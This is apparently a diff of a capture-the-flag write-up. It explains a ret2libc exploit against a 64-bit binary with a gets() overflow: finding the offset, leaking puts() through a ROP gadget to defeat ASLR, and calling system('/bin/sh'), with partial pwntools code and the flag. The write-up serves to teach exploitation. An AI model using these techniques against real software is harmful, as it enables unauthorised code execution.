@@ -7,7 +7,7 @@ After downloading the tar file, we untar it and we get some files:
 <img src="Images/files.png" width="700" >
 
 
-The script is:
+The source code is:
 ```c
 #include <stdio.h>
 
@@ -78,7 +78,7 @@ int main() {
 
 First of all we check what for file it is:
 
-<img src="Images/file.png" width="800" >
+<img src="Images/file.png" width="1000" >
 
 We can see its an 64 bit executable. 
 
@@ -91,15 +91,16 @@ It takes 255 chars in the buffer and gets() keeps on reading until it sees a new
 	gets(buf);
 ```
 
-Now with an buffer overflow, we are normally using shellcode to ececute something on the stack but for this challenge as we can read from binary:
+Now with an buffer overflow, we are normally using shellcode to execute something on the stack but for this challenge as we can read from the binary:
 ```
 "We use advanced technologies like NX bits and anti-hacking machine learning model"
 ```
 We can check it with checksec:
+You can see NX is enabled:
 
 <img src="Images/checksec.png" width="500" >
 
-It have NX enabled: NX is:
+NX is:
 
 ```
 Nx is short-hand for Non-Executable stack. What this means is that the stack region of memory is not executable. So if there is perfectly valid code there, you can't execute it due to it's permissions.
@@ -112,7 +113,7 @@ So we can't execute something on the stack. So what we need to do is ret2libc(re
 
 First of all we need to find the offset of the buffer overflow:
 
-I will do this in gdb:
+I will do this in gdb(I am using gef in gdb):
 
 Create the pattern:
 
@@ -133,17 +134,17 @@ We found the offset at 264.
 Now we found the offset, we need to find the libc base address, so that we can use system("/bin/sh") from the libc.
 To find the address, we can do:
 
-<img src="Images/ldd.png" width="500" >
+<img src="Images/ldd.png" width="800" >
 
 But as we can see here ASLR is enabled, so the address changing every time:
 
-<img src="Images/ldd1.png" width="500" >
+<img src="Images/ldd1.png" width="800" >
 
 ASLR is:
 ```
 Address space layout randomization is a computer security technique involved in preventing exploitation of memory corruption vulnerabilities.
 ```
-So now we need to leak a function to calculte the base address, we need to do this because of ASLR. 
+So now we need to leak a function to calculate the base address, we need to do this because of ASLR. 
 
 A nice article how to bypass ASLR with pwntools:
 
@@ -167,12 +168,10 @@ then `puts@plt`:
 
 <img src="Images/plt.png" width="500" >
 
-For more information why plt and got, check the article above.
- 
-Now because this is an 64 bit executable, we need to use a ROP gadget.
-In 64-bit binaries, function parameters are passed in registers.
-The first six parameters are passed in registers RDI, RSI, RDX, RCX, R8, and R9.
-The calling convention states that the first parameter of a method must be placed in the RDI register.
+For more information why plt and got, check the article above. 
+
+Now because this is an 64 bit executable, we need to use a ROP gadget.                                                                                             In 64-bit binaries, function parameters are passed in registers.                                                                                                   The first six parameters are passed in registers RDI, RSI, RDX, RCX, R8, and R9.                                                                                      The calling convention states that the first parameter of a method must be placed in the RDI register.                                                               
+
 So we need to find `POP RDI; RET` gadget. We can find gadgets with `ROPgadget`:
 
 ```
@@ -182,7 +181,7 @@ we find:
 ```
 0x0000000000401493 : pop rdi ; ret
 ```
-So now we can make the exploit to leak the libc address:
+So now we can make the exploit to leak the puts() address:
 
 ```py
 #!/usr/bin/env python3
@@ -209,7 +208,7 @@ leaked_output = p.recvline()
 leaked_output = leaked_output[:-1]
 print('leaked puts() addresss', leaked_output)
 ```
-And we leaked the puts() address. Now we can calculate the base address:
+And we leaked the puts() address. Now we can calculate the libc base address:
 
 ```py
 puts = u64((leaked_output + b"\x00\x00")[:8])
@@ -217,18 +216,21 @@ libc_addresss = puts - libc.symbols['puts']
 print("libc_addresss: ", hex(libc_addresss))
 ```
 We add 2 bytes because unpack requires 8 bytes. We set a limit of 8 with [:8].
+
 So now we have the base address, we can exploit it to get a shell.
 
-### Get shell
+### Shell
 
-Now we will find the address of system and /bin/sh:
+Now we need to find the address of system and /bin/sh:
 
 <img src="Images/system.png" width="1000" >
 
 <img src="Images/binsh.png" width="1000" >
 
-So now we got the addresses, we need to add this to the base address of libc to get the exact location.
-Now we have almost everything. I need an extra ROP gadget, because of stack alignment. 
+So now we got the addresses, we need to add this to the base address of libc to get the location.
+Now we have almost everything. 
+We need an extra ROP gadget, because of stack alignment. 
+
 I added the `ret` gadget:
 ```
 0x000000000040101a : ret
@@ -289,6 +291,10 @@ p.sendline(payload)
 p.interactive()
 ```
 
-Now we can get the flag:
+Now we can grab the flag:
 
 <img src="Images/flag.png" width="800" >
+
+Flag:
+
+corctf{mi11i0nt0k3n_1s_n0t_a_scam_r1ght}
